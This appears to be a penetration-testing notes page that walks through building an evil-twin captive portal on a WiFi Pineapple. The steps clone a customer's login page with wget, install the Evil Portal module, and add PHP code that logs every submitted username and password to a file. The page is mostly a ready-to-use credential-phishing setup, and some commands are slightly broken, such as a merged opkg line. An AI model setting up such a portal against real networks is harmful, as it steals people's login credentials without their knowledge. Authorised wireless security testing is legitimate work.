# WiFi Pineapple \| Captive Portal and Evil Twin



From WiFi Pineapple admin page

### Step \#1 \| Install Evil Portal

Go to **Modules** &gt;&gt; **Manage Modules** &gt;&gt; **Install Evil Portal**

### Step \#2 \| Create a New Portal

Go to **EvilPortal** &gt;&gt; **Create New Portal**

### Step \#3 \| Create Captive portal 

Clone the customer website or captive portal page

```text
$ wget -mkEpnp https://Customer/Pages/contractorlogin.aspx
```

{% hint style="info" %}
**Note:**

All portals are saved in: `/root/portals/` on WifiPineapple system
{% endhint %}

### Step \#3 \| **Configure** the Captive portal 

In `/root/portals/CustomerPortal`, edit \( MyPortal.php, index.php \) to be:

```php
<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {

        file_put_contents('/tmp/evilportal.log', "Username:"."{$this->request->username}\n", FILE_APPEND);
        file_put_contents('/tmp/evilportal.log', "Password:"."{$this->request->password}\n", FILE_APPEND);

        // Call parent to handle basic authorization first
        parent::handleAuthorization();

        // Check for other form data here
    }

    public function showSuccess()
    {
        // Calls default success message
        parent::showSuccess();
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}
```

{% hint style="info" %}
**Note:** 

All CSS and Javascript file that related to _index.php_ must be uploaded to wifi pineapple in the customer path\(eg. `/root/portals/CustomerPortal`\)
{% endhint %}

Zip the files, transfer them to wifi pineapple then unzip. You may need to install unzip command in wifi pineapple.

```text
scp _assets.zip root@172.16.42.1:/root/portals/CustomerPortal/
```

Install unzip on wifi pineapple

```text
opkg updateopkg install unzip
```

Unzip

```text
unzip _assets.zip
```

Finally, create the log file to collect credentials on wifi pineapple

```text
touch /tmp/evilportal.log
```

## **Resources**

* ​[https://www.youtube.com/watch?v=Kxj7riAdFgw](https://www.youtube.com/watch?v=Kxj7riAdFgw)​
* ​[https://www.youtube.com/watch?v=MVzS1164QgY](https://www.youtube.com/watch?v=MVzS1164QgY)​
* ​[https://www.youtube.com/watch?v=eJatmHNfTtQ](https://www.youtube.com/watch?v=eJatmHNfTtQ)​
* ​[https://www.youtube.com/watch?v=eJatmHNfTtQ](https://www.youtube.com/watch?v=eJatmHNfTtQ)

